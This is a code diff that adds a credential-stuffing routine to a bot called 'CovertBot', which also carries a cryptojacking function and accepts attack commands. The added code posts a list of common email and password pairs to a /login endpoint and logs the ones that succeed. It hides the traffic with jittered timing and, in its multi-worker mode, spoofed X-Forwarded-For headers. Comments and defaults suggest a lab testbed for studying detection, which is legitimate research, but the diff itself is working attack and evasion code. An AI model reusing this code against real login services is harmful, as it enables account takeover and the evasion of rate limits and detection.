@@ -532,6 +532,193 @@ def _run_cryptojack(duration: int, cpu: float, stop: threading.Event):
         time.sleep((1.0 - cpu) * 0.1)
     print("[COVERT] CRYPTOJACK done.")
 
+def _run_cred_stuffing(target: str, port: int, duration: int,
+                       mode: str, jitter_ms: int, n_workers: int,
+                       stop: threading.Event):
+    """
+    Credential stuffing against /login — Phase 2 inline implementation.
+ 
+    Tries to import from cred_stuffing.py first (subprocess delegation);
+    falls back to a lightweight inline loop so the bot works even when
+    cred_stuffing.py is absent from PATH.
+ 
+    Three modes (mirrors kademlia_p2p.c and cred_stuffing.py):
+      'bot'         — fixed 500 ms interval (low CV, easily detected)
+      'jitter'      — ±jitter_ms randomisation around 500 ms base
+      'distributed' — n_workers threads each spoofing X-Forwarded-For IP
+    """
+    import urllib.request
+    import urllib.parse
+    import urllib.error
+ 
+    # ── Try subprocess delegation first (cleanest — reuses full cred list) ──
+    try:
+        import subprocess
+        import shutil
+        if shutil.which("python3"):
+            if mode == "distributed":
+                cmd = [
+                    "python3", "cred_stuffing.py",
+                    "--mode", "distributed",
+                    "--host", target, "--port", str(port),
+                    "--workers", str(n_workers),
+                ]
+            else:
+                cmd = [
+                    "python3", "cred_stuffing.py",
+                    "--mode", mode,
+                    "--host", target, "--port", str(port),
+                    "--interval", "500", "--jitter", str(jitter_ms),
+                ]
+            print(f"[COVERT] CRED STUFFING (subprocess) -> {target}:{port}"
+                  f"  mode={mode}  jitter=±{jitter_ms}ms")
+            proc = subprocess.Popen(
+                cmd,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+            end = time.time() + duration
+            while time.time() < end and not stop.is_set():
+                if proc.poll() is not None:
+                    # Process exited early — restart if time remains
+                    if time.time() + 5 < end and not stop.is_set():
+                        proc = subprocess.Popen(
+                            cmd,
+                            stdout=subprocess.DEVNULL,
+                            stderr=subprocess.DEVNULL,
+                        )
+                time.sleep(1)
+            proc.terminate()
+            try:
+                proc.wait(timeout=3)
+            except subprocess.TimeoutExpired:
+                proc.kill()
+            print("[COVERT] CRED STUFFING done.")
+            return
+    except Exception as e:
+        print(f"[COVERT] cred_stuffing.py subprocess failed ({e}); using inline fallback")
+ 
+    # ── Inline fallback — compact credential list ─────────────────────────
+    CREDS = [
+        ("alice@example.com",  "password123"),
+        ("bob@example.com",    "123456"),
+        ("admin@example.com",  "admin"),
+        ("admin@example.com",  "admin123"),
+        ("admin@example.com",  "password"),
+        ("admin@example.com",  "securePass123!"),   # succeeds on fake_portal
+        ("root@server.com",    "root"),
+        ("root@server.com",    "toor"),
+        ("user@example.com",   "user"),
+        ("user@example.com",   "password1"),
+        ("test@test.com",      "test"),
+        ("support@app.com",    "support"),
+        ("guest@example.com",  "guest"),
+        ("pi@raspberry.com",   "raspberry"),
+        ("admin@example.com",  "1234"),
+        ("charlie@corp.com",   "charlie2024"),
+        ("dave@mail.com",      "monkey"),
+        ("eve@email.com",      "sunshine"),
+        ("frank@net.com",      "dragon"),
+        ("grace@web.io",       "batman"),
+        ("john.doe@corp.com",  "John2024"),
+        ("info@company.com",   "info2024"),
+        ("admin@example.com",  "letmein"),
+        ("bob@example.com",    "iloveyou"),
+        ("alice@example.com",  "qwerty"),
+        ("root@server.com",    "123456"),
+        ("user@example.com",   "user"),
+        ("test@test.com",      "test123"),
+        ("admin@example.com",  "pass"),
+        ("support@app.com",    "support123"),
+    ]
+ 
+    url = f"http://{target}:{port}/login"
+    BASE_MS = 500
+    hits = []
+    lock_hits = threading.Lock()
+ 
+    print(f"[COVERT] CRED STUFFING (inline) -> {url}"
+          f"  mode={mode}  jitter=±{jitter_ms}ms  pairs={len(CREDS)}")
+ 
+    def _post(email: str, password: str, extra_headers: dict = None) -> int:
+        body = urllib.parse.urlencode(
+            {"email": email, "password": password}
+        ).encode()
+        hdrs = {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "User-Agent": "Mozilla/5.0 (compatible; Research/1.0)",
+        }
+        if extra_headers:
+            hdrs.update(extra_headers)
+        req = urllib.request.Request(url, data=body, headers=hdrs)
+        try:
+            with urllib.request.urlopen(req, timeout=5) as resp:
+                return resp.status
+        except urllib.error.HTTPError as e:
+            return e.code
+        except Exception:
+            return 0
+ 
+    def _sleep(base_ms: int):
+        if mode == "bot":
+            time.sleep(base_ms / 1000.0)
+        else:
+            delta = random.uniform(-jitter_ms, jitter_ms)
+            time.sleep(max(50, base_ms + delta) / 1000.0)
+ 
+    def _fake_ip() -> str:
+        return (f"10.{random.randint(0, 255)}"
+                f".{random.randint(1, 254)}"
+                f".{random.randint(1, 254)}")
+ 
+    if mode == "distributed":
+        chunk = max(1, len(CREDS) // max(1, n_workers))
+ 
+        def _worker(creds_chunk, wid):
+            fake_ip = _fake_ip()
+            hdrs = {
+                "X-Forwarded-For": fake_ip, "X-Real-IP": fake_ip,
+                "User-Agent": f"Mozilla/5.0 (rv:{random.randint(90, 120)}.0)",
+            }
+            end = time.time() + duration
+            for email, pwd in creds_chunk:
+                if stop.is_set() or time.time() > end:
+                    break
+                status = _post(email, pwd, hdrs)
+                if status == 200:
+                    with lock_hits:
+                        hits.append((email, pwd))
+                    print(f"[COVERT-{wid}] CRED HIT: {email}:{pwd} (from {fake_ip})")
+                _sleep(BASE_MS // max(1, n_workers))
+ 
+        threads = []
+        for wid in range(n_workers):
+            c = CREDS[wid * chunk:(wid + 1) * chunk]
+            t = threading.Thread(target=_worker, args=(c, wid), daemon=True)
+            threads.append(t)
+        for t in threads:
+            t.start()
+        end_t = time.time() + duration
+        while time.time() < end_t and not stop.is_set():
+            time.sleep(0.5)
+        stop.set()
+        for t in threads:
+            t.join(timeout=3)
+    else:
+        end_t = time.time() + duration
+        while time.time() < end_t and not stop.is_set():
+            for email, pwd in CREDS:
+                if stop.is_set() or time.time() > end_t:
+                    break
+                status = _post(email, pwd)
+                if status == 200:
+                    with lock_hits:
+                        hits.append((email, pwd))
+                    print(f"[COVERT] CRED HIT: {email}:{pwd}")
+                _sleep(BASE_MS)
+ 
+    print(f"[COVERT] CRED STUFFING done.  mode={mode}  hits={len(hits)}"
+          + (f"  valid={hits}" if hits else ""))
 
 # ── Main bot loop ─────────────────────────────────────────────
 
@@ -611,7 +798,15 @@ class CovertBot:
             duration = int(cmd.get("duration", 120))
             cpu      = float(cmd.get("cpu", 0.25))
             self._launch("cryptojack", _run_cryptojack, duration, cpu)
-
+        elif cmd_type == "cred_stuffing":
+            target   = cmd.get("target", "192.168.100.20")
+            port     = int(cmd.get("port", 80))
+            duration = int(cmd.get("duration", 120))
+            mode     = cmd.get("mode", "jitter")
+            jitter   = int(cmd.get("jitter", 200))
+            workers  = int(cmd.get("workers", 3))
+            self._launch("cred_stuffing", _run_cred_stuffing,
+                         target, port, duration, mode, jitter, workers)
         elif cmd_type == "stop_all":
             print(f"[COVERT] stop_all — halting active attacks")
             with self._active_lock:
